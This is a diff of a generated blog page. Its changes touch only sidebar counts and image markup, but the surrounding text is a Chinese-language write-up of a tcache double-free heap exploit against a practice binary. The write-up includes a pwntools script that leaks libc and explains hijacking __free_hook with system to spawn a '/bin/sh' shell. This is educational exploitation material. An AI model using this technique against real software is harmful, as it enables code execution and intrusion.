@@ -217,11 +217,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -324,17 +324,17 @@
 
 <p>第二個不同是，原本的ptr array變成了變數，一次只能操作當前最新malloc的chunk</p>
 <p>首先我們先leak libc，蓋0x78個a+一個\n會蓋到stack上的libc前面，printf會把它印出來，之後offset用動態抓扣出來</p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJsAe9cvA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJsAe9cvA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/rkazxc9PA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkazxc9PA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/SJsAe9cvA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rkazxc9PA.png" alt="image"></p>
 <p>我們可以看到double free完後他變成了一個指向自己的循環</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache bin -&gt; chunk 1 -&gt; chunk 1 -&gt; ...</span><br></pre></td></tr></table></figure>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bkr-6F5vR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bkr-6F5vR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/Bkr-6F5vR.png" alt="image"></p>
 <p>目前腳本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./tcachedup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x21b97</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(r.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ leak libc: &#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ libc base: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache dup</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;g_ptrs: &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> r.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">val</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.send(val)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>接下來malloc會拿到chunk 1<br>之後我們先找兩個東西的offset，free hook(0x3ebc30)跟system(0x4f440)</p>
 <p>我們把malloc的fd改成free hook，如圖已經改寫成功，所以tcache bin變成</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache bin -&gt; chunk 1 -&gt; free hook</span><br></pre></td></tr></table></figure>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/B1Tbnq9wC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1Tbnq9wC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/B1Tbnq9wC.png" alt="image"></p>
 <p>create兩次拿到free hook，寫入system，之後直接malloc一塊，把記憶體寫成&#x2F;bin&#x2F;sh，這樣就會有一個<code>free(ptr)</code>，ptr-&gt;&#x2F;bin&#x2F;sh</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(&quot;/bin/sh&quot;) -&gt; (*__free_hook)(&quot;/bin/sh&quot;) -&gt; system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
 
@@ -428,7 +428,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -480,11 +480,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
